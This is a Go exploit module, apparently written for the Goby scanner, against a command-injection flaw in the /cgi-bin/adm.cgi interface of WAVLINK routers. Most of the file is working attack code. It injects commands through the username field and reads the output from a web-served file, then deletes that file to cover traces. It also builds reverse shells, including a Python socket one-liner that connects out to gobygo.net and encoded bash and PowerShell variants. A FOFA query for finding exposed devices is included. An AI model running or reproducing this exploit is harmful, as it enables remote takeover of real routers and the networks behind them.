package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "WAVLINK WL-WNJ575A3 /adm.cgi  Command Execution Vulnerability",
    "Description": "<p>WAVLINK is a router developed by WAVLINK in China. </p><p>A command execution vulnerability exists at the WAVLINK router/adm.cgi interface, through which an attacker can obtain server privileges.</p>",
    "Product": "WAVLINK-Wi-Fi-APP",
    "Homepage": "https://www.wavlink.com/en_us/index.html",
    "DisclosureDate": "2023-09-28",
    "PostTime": "2024-09-19",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"Wi-Fi APP Login\" && (body=\"md5.js\" || body=\"common.js\")",
    "GobyQuery": "title=\"Wi-Fi APP Login\" && (body=\"md5.js\" || body=\"common.js\")",
    "Level": "2",
    "Impact": "<p>A command execution vulnerability exists at the WAVLINK router/adm.cgi interface, through which an attacker can obtain server privileges.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/TTY-flag/my_iot_vul/tree/main/WAVLINK/WL-WN575A3"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "ls",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "WAVLINK WL-WNJ575A3 /adm.cgi 命令执行漏洞",
            "Product": "WAVLINK-Wi-Fi-APP",
            "Description": "<p>WAVLINK是中国睿因科技（WAVLINK）公司开发的一款路由器。<br></p><p>WAVLINK路由器/adm.cgi接口处存在命令执行漏洞，攻击者可通过该漏洞获取服务器权限。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>WAVLINK路由器/adm.cgi接口处存在命令执行漏洞，攻击者可通过该漏洞获取服务器权限。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "WAVLINK WL-WNJ575A3 /adm.cgi  Command Execution Vulnerability",
            "Product": "WAVLINK-Wi-Fi-APP",
            "Description": "<p>WAVLINK is a router developed by WAVLINK in China.&nbsp;</p><p>A command execution vulnerability exists at the WAVLINK router/adm.cgi interface, through which an attacker can obtain server privileges.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>A command execution vulnerability exists at the WAVLINK router/adm.cgi interface, through which an attacker can obtain server privileges.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9954"
}`
	setPayloadRequestHash_dnsyhacnhsdcyaicskhyaycxvavxczxahxycsyuvaubh := func(hostInfo *httpclient.FixUrl, command string, echo bool) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		//漏洞url地址
		vulURL := "/cgi-bin/adm.cgi"
		requestConfig := httpclient.NewPostRequestConfig(vulURL)
		requestConfig.VerifyTls = false
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		requestConfig.FollowRedirect = false
		tmpFileName := ""
		if echo == true {
			tmpFileName = goutils.RandomHexString(6) + ".txt"
			command = command + ` >/etc_ro/lighttpd/www/` + tmpFileName
		}
		//command的"替换为\"
		command = strings.Replace(command, "'", "\\'", -1)
		//command进行url编码
		command = url.QueryEscape(command)
		payload := "page=sysAdm&SYSPASS=password&username='`" + command + "`'&newpass=12345678"
		requestConfig.Data = payload
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to RCE")
			return "", vulURL, err
		}
		commandResult := ""
		if echo == true {
			GetrequestConfig := httpclient.NewGetRequestConfig("/" + tmpFileName)
			GetrequestConfig.VerifyTls = false
			GetrequestConfig.FollowRedirect = false
			Getresp, err := httpclient.DoHttpRequest(hostInfo, GetrequestConfig)
			if err != nil || Getresp.StatusCode != 200 {
				err = errors.New("failed to read file")
				payload = "page=sysAdm&SYSPASS=password&username='`rm%20%2Fetc_ro%2Flighttpd%2Fwww%2F" + tmpFileName + "`'&newpass=12345678"
				requestConfig.Data = payload
				httpclient.DoHttpRequest(hostInfo, requestConfig)
				return "", vulURL, err
			}
			commandResult = Getresp.RawBody
			//清理痕迹
			payload = "page=sysAdm&SYSPASS=password&username='`rm%20%2Fetc_ro%2Flighttpd%2Fwww%2F" + tmpFileName + "`'&newpass=12345678"
			requestConfig.Data = payload
			httpclient.DoHttpRequest(hostInfo, requestConfig)
			return commandResult, vulURL, nil
		}

		return commandResult, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash_dnsyhacnhsdcyaicskhyaycxvavxczxahxycsyuvaubh

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand, true)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash_dnsyhacnhsdcyaicskhyaycxvavxczxahxycsyuvaubh

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command, true)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command, false)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
